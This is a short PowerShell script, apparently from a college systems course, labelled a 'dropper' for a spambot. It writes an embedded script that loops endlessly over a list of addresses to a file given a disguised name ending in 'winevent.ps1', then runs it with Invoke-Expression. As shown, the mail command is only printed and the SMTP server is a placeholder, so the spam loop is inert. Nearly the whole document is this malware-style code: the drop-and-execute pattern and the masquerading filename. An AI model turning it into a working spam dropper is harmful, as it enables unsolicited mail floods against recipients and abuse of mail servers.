# Storyline: Dropper for our spambot that will save to a directory and then execute it

$writeSbBot = @'

# Send an email using Powershell

$toSend = @('micah.kezar@mymail.champlain.edu', 'micah.kezar@mymail.champlain.edu', 'micah.kezar@mymail.champlain.edu')


# Message Body

$msg = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

while($true) {

    foreach ($email in $toSend) {


        # Send the Email
        write-host "Send-MailMessage -from 'micah.kezar@mymail.champlain.edu' to '$email' -Subject 'Tisk Tisk' `
        -Body $msg -SmtpServer X.X.X.X"

        # Pause for 1 second
        start-sleep 1
    }
}
'@
# Directory to write the bot
$sbDir = 'C:\Users\micah\Documents\SYS320\SYS_320_FA22\'

# Create a random number to add to the file.

$sbRand = Get-Random -Minimum 1000 -Maximum 2002

Write-Output "Your File's Random Number is:" $sbRand

# Create the file and location to save the bot

$file = $sbDir + $sbRand + "winevent.ps1"

# write to a file
$writeSbBot | out-file -FilePath $file

# Execute the Spambot
Invoke-Expression $file